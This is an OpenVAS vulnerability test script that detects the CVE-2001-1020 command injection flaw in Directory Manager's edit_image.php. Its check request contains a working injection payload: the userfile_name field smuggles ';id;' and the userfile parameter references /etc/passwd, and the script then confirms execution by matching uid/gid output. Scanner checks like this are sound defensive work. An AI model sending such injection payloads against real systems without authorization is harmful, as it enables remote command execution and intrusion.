###############################################################################
# OpenVAS Vulnerability Test
# $Id: directory_manager.nasl 10033 2018-05-31 07:51:19Z ckuersteiner $
#
# Directory Manager's edit_image.php
#
# Authors:
# Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2002 Renaud Deraison
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Ref: http://cert.uni-stuttgart.de/archive/bugtraq/2001/09/msg00052.html

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80054");
  script_version("$Revision: 10033 $");
  script_bugtraq_id(3288);
  script_cve_id("CVE-2001-1020");
  script_tag(name:"last_modification", value:"$Date: 2018-05-31 09:51:19 +0200 (Thu, 31 May 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Directory Manager's edit_image.php");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Renaud Deraison");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Directory Manager is installed and does not properly filter user input.");

  script_tag(name:"impact", value:"A cracker may use this flaw to execute any command on your system.");

  script_tag(name:"solution", value:"Upgrade your software or firewall your web server");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

http_check_remote_code (
			check_request:"/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			port:port
			);
